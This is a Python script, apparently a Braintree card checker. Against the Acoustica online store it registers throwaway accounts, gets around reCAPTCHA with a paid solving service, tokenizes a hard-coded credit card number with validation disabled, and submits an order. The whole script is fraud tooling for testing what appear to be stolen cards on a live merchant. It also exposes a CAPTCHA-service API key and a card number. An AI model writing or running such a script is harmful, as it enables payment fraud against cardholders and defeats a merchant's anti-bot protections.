import requests
import asyncio
import capsolver
import uuid

def random_email():
    import random
    import string
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    domains = ['@gmail.com', '@hotmail.com']
    return name + random.choice(domains)

email = random_email()

capsolver.api_key = "CAP-02DB3E5188C3DDD58C43DCF9B69FE560"

async def b3avs2():
    g_response = (await asyncio.to_thread(lambda: capsolver.solve({
    "type": "ReCaptchaV2TaskProxyLess",
    "websiteKey": '6Lc_3AQmAAAAADCiBgA_b3bd9u2W3afNWrxVFaUU',
    "websiteURL": 'https://store.acoustica.com/',
    })))['gRecaptchaResponse']
    web = requests.session()
    
    req1 = web.get('https://store.acoustica.com/register')
    token = req1.text.split('name="_token" value="')[1].split('"')[0].strip()

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6ImplYm5OZnkxd0ZxQWx1QjlGN1pMN1E9PSIsInZhbHVlIjoiNCsxUmhmSjZWTXVuZ0FpMkRjdGFmTVVGbElSclUxbStYVzJxdHRYMUc3ZjdLVjE0bGU0cEtjNTMrKzFPR2Q4eWJXMHo4bTJTcnc1V0tBUC9XTjQrRUQwUjZzMGl3WVNGMlBGU1FPOWRtNTRyMGNLbjNNL3IzdW9RdjRKNmtOSlMiLCJtYWMiOiJhNDAzMGU1YjI2N2Q1ZTYwYWE5N2NhYWI2ZWIwMTVmNTZiOGY5ZGIzZWJiNjM3NjhlNmViOGI4Y2YyYzNkM2Q5IiwidGFnIjoiIn0%3D; acoustica_store_session=eyJpdiI6ImVxSFFRbmJkaUdUZ1ExUjBtTXplc1E9PSIsInZhbHVlIjoiYUNHdWdKM09IVVlkMVNobDN5MElLS29WN0NrVVBzUVl1VGdxNk9PbnZ0KzFZdFJBMW42SHhNNG1EUHNxb0FTdjEzd1kvL3RudnhOUEhUODk4REhYT01BMTR4dHZjVC91NENSN3BjOGl1aGF1ZjlyVE5OQjVueDQ1U1NocGlvWk8iLCJtYWMiOiIyY2UxZjJjZmQwMjBjNTMxODU3OTJkZGY2NDg5OTYyYWFmZTQyNDdlNDgxODM4OGMyYzkyNGVjMTAyNGUxZTY0IiwidGFnIjoiIn0%3D',
        'origin': 'https://store.acoustica.com',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://store.acoustica.com/register',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    data = {
        '_token': token,
        'name': str(uuid.uuid4())[:10],
        'email': email,
        'username': str(uuid.uuid4())[:5],
        'password': 'SQj3epgxyjM5g.S',
        'password_confirmation': 'SQj3epgxyjM5g.S', 
        'g-recaptcha-response': g_response,
    }

    req2 = web.post('https://store.acoustica.com/register', headers=headers, data=data)

    headers = {
        'accept': 'text/html, application/xhtml+xml',
        'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        # 'cookie': '_ga=GA1.1.1594738650.1731572985; _ga_P387EQK978=GS1.1.1731572985.1.1.1731573002.43.0.0; XSRF-TOKEN=eyJpdiI6IjY0L2hkNjVyWDM0R0crbUMxR200MUE9PSIsInZhbHVlIjoiWXAwOVhvcWxJeHNyNVBiN3FRRFoycU1tT3pZaTlWL3VNYWtGbmJQcDlBYUhCakZ1T1BPTlhqRXIwRjFnc0lRQVUxV3B0a3E5Mmxhb0ZrUnFCeFVIOVBBVEV0K0dBOWhPL2FsQmdLQVVNcEtzRXBLZytHK2NPVnJtUGRJMmkwZjMiLCJtYWMiOiJmMTU5NzkwZGExNzU0NDU4ZGMzNmUwM2FkZDg4N2RkZTkzMmFjZjZhNGZkODM0Y2MxNTM0ZWRlNjdlZWRiOTIxIiwidGFnIjoiIn0%3D; acoustica_store_session=eyJpdiI6IkJHTVdvYlMzYUJpOFN1UEp1Q0hRYVE9PSIsInZhbHVlIjoia3JOclRCbDFNellxWk1nK055WlVlb2dMUmozQ3dNMEtaTkpCMDBvcHRkckpYMTZrOHNvZ0FWTjNhaHVjVGgxblZLVDdBdWpZb1NPblJzb3VuejJaSytFdm9CcFN1WUZTYnZSNkVycnZ3VnBmNjNRMnYxcDdTZGI3djIrbkd6MmciLCJtYWMiOiJlNjJjY2I1ZjFhZGUyYzYwMTFkZjc5MzUyZTdlN2M5ODc5ZjU2N2JkMjFhYWYwMTk5NDNmNTM2MDljOTQwYzc2IiwidGFnIjoiIn0%3D',
        'origin': 'https://store.acoustica.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://store.acoustica.com/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'x-csrf-token': 'eIqJLDJHveJh4n74o9a4ksEimUSzrfoQtshRwyzl',
        'x-livewire': 'true',
    }

    json_data = {
        'fingerprint': {
            'id': 'u4P4cfr7JK2a1TkTleyl',
            'name': 'commerce.cart',
            'locale': 'en',
            'path': '/',
            'method': 'GET',
            'v': 'acj',
        },
        'serverMemo': {
            'children': [],
            'errors': [],
            'htmlHash': '9b07a9a6',
            'data': {
                'class': None,
                'product': [],
                'isInCart': False,
                'isDemoAvailable': False,
            },
            'dataMeta': {
                'models': {
                    'product': {
                        'class': 'App\\Models\\Product',
                        'id': 334,
                        'relations': [
                            'type',
                            'type.categories',
                            'manufacturer',
                            'currentBuild',
                            'currentBuild.media',
                            'currentBuild.categories',
                            'currentBuild.bundleProducts',
                            'deals',
                        ],
                        'connection': 'mysql',
                        'collectionClass': None,
                    },
                },
            },
            'checksum': '5f1a173cf6e08f90e33de76b5f8888050386bea28d7da1f2b2082b214326249e',
        },
        'updates': [
            {
                'type': 'callMethod',
                'payload': {
                    'id': 'qym1',
                    'method': 'add',
                    'params': [],
                },
            },
        ],
    }

    req3 = web.post('https://store.acoustica.com/livewire/message/commerce.cart',headers=headers,json=json_data,)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
        'cache-control': 'no-cache',
        # 'cookie': '_ga=GA1.1.1594738650.1731572985; _ga_P387EQK978=GS1.1.1731572985.1.1.1731573002.43.0.0; XSRF-TOKEN=eyJpdiI6IkhabmVEZG5TVFpwWnJNV3ZYN3h0TVE9PSIsInZhbHVlIjoia01BM1ZrQXUyK3RRMTdDTWlDTjY5NndYdm9rdWNvM3BFOFRiYlZrZG50aStwenA1QXZSU2FNWDFheGREU0Z2RUl3SGZRdDI0anBablFMcFBkVThLbkZBRU91UmNRVnpKcjZoUHk4N3ZEYVMzMnNTTjZBM2dneDF6cGV6OWFhRHkiLCJtYWMiOiJhMGViMDUyMWEzN2ZjMmI3YzRhM2NmYmZlNDVhZTk5Mzc2ZjNjMjkzNThhMjNiOTA0Mzk2OWIyZTMwMzQ2ODY5IiwidGFnIjoiIn0%3D; acoustica_store_session=eyJpdiI6IndYWU1FTkdmUnNySzNrRGhqaFJ2R1E9PSIsInZhbHVlIjoieHMvbHZmQlg5YVFlTFF2T0FoL1VyOHZaVFp3bGVCVjZlTUl1Tk4vUUp0UFU0VnFoVDE4RDZHTTJqa3o2OTZVaXNLSnhSdDlBSTEvbE1KYTMyVlZFK3gxL055VXM2dWNVbmdIR2lIQnJyaFllbm1jenVYWU41UmtJMGRiRXZDcjkiLCJtYWMiOiIwNjJlN2QzNzM0YmJkOThkYTAwMTBiNzUxNTJjMTVlODkyNGFiNTFiM2RkZGRmMmU1NjgxNTllZmEzNGEyNDM4IiwidGFnIjoiIn0%3D',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://store.acoustica.com/recurring_biller/mixcraft-105-recording-studio-rent-to-own',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    req4 = web.get('https://store.acoustica.com/my/cart', headers=headers)
    cookies = req4.headers.get('set-cookie')
    xsrf_token = ''
    if cookies:
        for cookie in cookies.split(';'):
            if 'XSRF-TOKEN=' in cookie:
                xsrf_token = cookie.split('XSRF-TOKEN=')[1].split(';')[0].strip()
                break

    print(f"XSRF Token: {xsrf_token}")
    headers = {
        'accept': '*/*',
        'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
        'authorization': 'Bearer production_24s5y88b_pswg83t27p2byffk',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'dropin2',
            'sessionId': '212de4e1-aa65-46d3-b21b-63794894f5d0',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': '4166830045792415',
                    'expirationMonth': '04',
                    'expirationYear': '2028',
                    'cvv': '000',
                    'cardholderName': 'asd as da',
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    req5 = web.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    cctoken = req5.json()['data']['tokenizeCreditCard']['token']
    print(token)

    g_response2 = (await asyncio.to_thread(lambda: capsolver.solve({
    "type": "ReCaptchaV3TaskProxyLess",
    "websiteKey": '6LfGZo4pAAAAAK26NZIuecR-sPhVfUeJdZZGZE0q',
    "websiteURL": 'https://store.acoustica.com/my/cart',
    })))['gRecaptchaResponse']

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        # 'cookie': '_ga=GA1.1.1594738650.1731572985; _ga_P387EQK978=GS1.1.1731572985.1.1.1731573002.43.0.0; onboarded=eyJpdiI6IllGZWViSFBDYUdlcVpuaExaRzZSd3c9PSIsInZhbHVlIjoiSklTdUpDR3Z6d0t3OVBvTENmZFRjUlhIcUU0NjlhVmt2Ym1JbE1SZ0NiaHF1VURmZ0d1WEFnZ04zWG5SQTlHcSIsIm1hYyI6IjdkNDU4NmU0OWM5MDRlN2Y2OTNiYmQ5ZGJkYTg4MGRiYTA3MjY2ODZhM2Q0YTUzZWQ0ZThiYjFkMGQ5MTBiNjAiLCJ0YWciOiIifQ%3D%3D; laravel_token=eyJpdiI6Im1kc0Myd05FREtMNnBncnpHd2gxcUE9PSIsInZhbHVlIjoibzRLZ2pzOWw5TS9pOWlVbzVFWkdEUzl2OHdyb25STEhGREwvMGVsQUduaGNqbTJ2NmhFYkRweUVYOEhSRjN4NzJud2xZcVFsWmhtWi9QeHdYT1BGNVBnYUVlV05HY25vUFo1MmJ4RFVWbUFaRXFUbWU5MFE1eUk5c1VBYVEvV3Z5UmZHUkJCUFArTTRhUEM5aEczYjJsai92Nm1HUkt5UC9zNVpHM3dMWS9BWjAyQ1B1UkFFeWtOWkpmTzhuTDdyT3hmWXVYenFVRjNWTlh6bytwVy83RDNHZEJyUlBOZy9ub2NHU1FpSjQ3N3R5ZTFUV051NTNScENmcGtzUCtwYTI1dXdndDdOeDQzMHU0aXFPTVZyYUpGV3NCOG9ZWnZuNVl6WWY5Z3J2ZTR4TzBvQkxzcUVXQnZvU0NvMzZ5L0UiLCJtYWMiOiJlOWUxMmRmOTBhYjJjY2M4NGIxYzk5NjU0ZmQ0ZmI2Yzk1Y2E0ZjQxZGMzNGRjYWM1ODA3YjVjMGYwYmIzYzU3IiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6IkF4MUlvaWZnVktMZU1WVXZDUWFrREE9PSIsInZhbHVlIjoieUZqeHRnclp4Slh5R2JvNG12Kzk4SkZsa1pocnRoYTRiMm1QemRoMlg1bGE4UktCUUp0b2NmalRReHA5WTIycmRLYWVaYjdZTTBsTlZZcENHVnFGNVRZSjBVNllKVlhzREZXZ1YxazNkdnZKWGtIM3pwU1U0OXpDL0Q5a1NlQ3kiLCJtYWMiOiIzNjAyYTY2YTMxZTVhZGIyZjkyMWQ1M2FjMjU4ZWYzYmQ3YzU3YzMxM2M0ODE4YTY0MzUxZjY0YjY1MGI5OTg1IiwidGFnIjoiIn0%3D; acoustica_store_session=eyJpdiI6Ilc5NnltdFc0VnNwUmhsM2xUQmJMR1E9PSIsInZhbHVlIjoid3RWZWhraEdyQlJoQ1VSZnVMMzdUMFpOeU9JdTBCaW9laUtlY0FJRjRBY3Y5VGlGdzY5OWtmK0JDZytUR3VVU3hma2M3QWpPZXM2VVVkNTY0bUtlcjh5Wlp0SXZYaFNua3lBZEoxR3RLTnRmRS85N05JeTFyQkxZV0ZvbVRwYW8iLCJtYWMiOiI5YmU0NjExMGM1MmI5YTBmMTQ0Yzk3OGNiZWNhMTgyNDQ2YjYyZmY5MDk5ZDg5Mjg4NTA2Y2QyZjgyOGQ4Y2Y1IiwidGFnIjoiIn0%3D',
        'origin': 'https://store.acoustica.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://store.acoustica.com/my/cart',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
        'x-xsrf-token': xsrf_token,
    }

    json_data = {
        'payment_token': cctoken,
        'purchased_as_gift': False,
        'gift_recipient_email': '',
        'gift_message': '',
        'gift_sender': '',
        'use_loyalty_credits': False,
        'g_recaptcha_response': g_response2,
    }

    req6 = web.post('https://store.acoustica.com/api/products/334/orders', headers=headers, json=json_data)
    print(req6.text)

asyncio.run(b3avs2())